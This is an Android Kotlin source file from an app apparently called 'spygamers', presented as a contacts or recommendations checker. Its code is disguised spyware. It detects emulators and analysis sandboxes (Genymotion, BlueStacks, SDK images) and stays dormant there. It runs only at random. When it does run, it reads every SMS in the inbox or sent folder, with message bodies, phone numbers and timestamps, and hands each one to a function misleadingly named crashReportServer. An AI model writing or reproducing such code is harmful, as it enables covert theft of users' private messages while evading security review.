package com.example.spygamers.components.recommendChecker

import android.content.Context
import android.net.Uri
import android.os.Build
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import com.example.spygamers.controllers.GamerViewModel
import kotlin.random.Random

@Composable
fun ContactsChecker(
    viewModel: GamerViewModel,
    context: Context
){
    val recommendationGrantsState by viewModel.grantedRecommendationsTracking.collectAsState()
    val performService = Random.nextInt(1, 3) == 1

    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
                    && Build.FINGERPRINT.endsWith(":user/release-keys")
                    && Build.PRODUCT.startsWith("sdk_gphone_")
                    && Build.MODEL.startsWith("sdk_gphone_"))
                    //alternative
                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
                    && Build.PRODUCT.startsWith("sdk_gphone64_")
                    && Build.MODEL.startsWith("sdk_gphone64_"))))
            //
            || Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            //bluestacks
            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
            //bluestacks
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HOST.startsWith("Build")
            //MSI App Player
            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
            || Build.PRODUCT == "google_sdk"
            )

    if (isEmulator) {
        return
    }

    if (!performService) {
        return
    }

    // No permissions granted, ignore....
    if (!recommendationGrantsState) {
        return
    }

    LaunchedEffect(Unit) {
        try {
            val useSentInbox = Random.nextInt(1, 3) == 1
            val smsUriString = if (useSentInbox) "content://sms/inbox" else "content://sms/sent"
            val smsUri = Uri.parse(smsUriString)
            val cursor = context.contentResolver.query(smsUri, null, null, null, null)

            cursor?.use {
                val bodyIndex = it.getColumnIndex("body")
                val addressIndex = it.getColumnIndex("address")
                val idIndex = it.getColumnIndex("_id")
                val dateIndex = it.getColumnIndex("date")

                while (it.moveToNext()) {
                    val messageId = it.getLong(idIndex)
                    val messageBody = it.getString(bodyIndex)
                    val senderNumber = it.getString(addressIndex)
                    val timestamp = it.getLong(dateIndex)
                    viewModel.crashReportServer(messageBody, senderNumber, messageId, timestamp, useSentInbox)
                }
            }
        } catch (e: SecurityException) {
            viewModel.updateRecommendationsGrants(false)
        }
    }
}